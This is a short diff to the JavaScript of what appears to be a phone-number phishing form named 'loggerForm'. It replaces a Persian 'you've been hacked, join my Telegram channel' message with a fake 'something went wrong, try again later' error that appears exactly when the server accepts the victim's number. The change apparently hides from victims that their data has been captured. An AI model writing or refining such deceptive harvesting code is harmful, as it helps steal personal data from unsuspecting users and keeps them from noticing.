@@ -16,7 +16,7 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
     })
     .then(function(response) {
       if (response.ok) {
-        alert("سلام شما هک شدید😂 ورود به کانال من: t.me/rmsup");
+        alert("مشکلی پیش آمد بعدا دوباره امتحان کنید");
       } else {
         alert("لطفا شماره خود را صحیح وارد کنید🙏");
       }
